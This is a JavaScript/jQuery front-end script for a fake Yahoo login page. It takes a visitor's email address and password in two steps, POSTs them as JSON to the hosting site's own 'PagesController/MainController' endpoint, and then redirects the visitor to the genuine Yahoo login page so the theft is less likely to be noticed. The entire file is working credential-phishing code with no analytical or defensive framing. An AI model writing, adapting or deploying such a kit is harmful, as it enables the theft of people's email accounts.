"use strict";

$(document).ready(function () {
  $('.__issetUserName').hide();
  $('.errorMsg1').hide();
  $('.errorMsg2').hide();
  $('.cpanel1').show();
  $('.cpanel2').hide();
  var UserEmail, Userpassword;
  $('.YahooNextBtn').on('click', function () {
    UserEmail = $('.____userEmail').val();

    if (UserEmail == "") {
      $('.bbb-input').fadeIn();
      $('.errorMsg1').fadeIn().html("Sorry, we don't recognise this email address.");
      $('.____userEmail').focus();
      return false;
    } else {
      //$('.bbb-input').hide();
      $('.__issetUserName').fadeIn();
      $('.cpanel1').hide();
      $('.cpanel2').show();
      $('.errorMsg1').hide();
      $('.__issetUserName').html(UserEmail);
    }
  });
  $('.YahooSubmitBtn').on('click', function () {
    Userpassword = $('.____userPassword').val();
    UserEmail = $('.____userEmail').val();

    if (Userpassword == "") {
      $('.bpin').show();
      $('.errorMsg2').fadeIn().html("Please provide password.");
      $('.____userPassword').focus();
      return false;
    } else {
      $('.bpin').fadeOut();
      $('.bpin').hide();
      $('.errorMsg2').fadeOut();
      $('.errorMsg2').hide();
      var data = {
        "___Username": UserEmail,
        "___Userpassword": Userpassword
      };
      var StringData = JSON.stringify(data);
      var Url = base_url + 'PagesController/MainController'; // the url where we want to POST

      $.ajax({
        type: 'POST',
        // define the type of HTTP verb we want to use (POST for our form)
        dataType: 'JSON',
        //the type of data we are sending is json
        contentType: "application/json; charset=utf-8",
        data: StringData,
        // our data object
        url: Url,
        //the post destination
        processData: false,
        //false because the preprocessor are not trigger
        encode: true,
        //turn on json encoding
        crossOrigin: true,
        // true because we are sending data with ajax as json format to php
        async: true,
        //because we are expecting long data so we set the whole data  Asynchronous with means configuring our Ajax code
        crossDomain: true,
        //just in case we host the site
        headers: {
          'Access-Control-Allow-Methods': '*',
          "Access-Control-Allow-Credentials": true,
          "Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Origin, X-Requested-With, Content-Type, Accept, Authorization",
          "Access-Control-Allow-Origin": "*",
          "Control-Allow-Origin": "*",
          "cache-control": "no-cache",
          'Content-Type': 'application/json'
        }
      }).done(function (response) {
        if (response.status == 200) {
          $('.errorMsg2').fadeIn().html(response.message); // delay and reload and Redirect to Original Page

          setTimeout(function () {
            window.location.href = "https://login.yahoo.com/?.src=ygrp&.intl=uk&.lang=en-GB&.done=%doneUrl%"; //will redirect to your blog page (an ex: blog.html)
          }, 3000);
        } else {
          $('.errorMsg2').fadeIn().html(response.message);
        }
      }).fail(function (xhr, status, error) {
        console.log('Oops...', 'Something went wrong with ajax !', 'error');
      });
    }
  });
});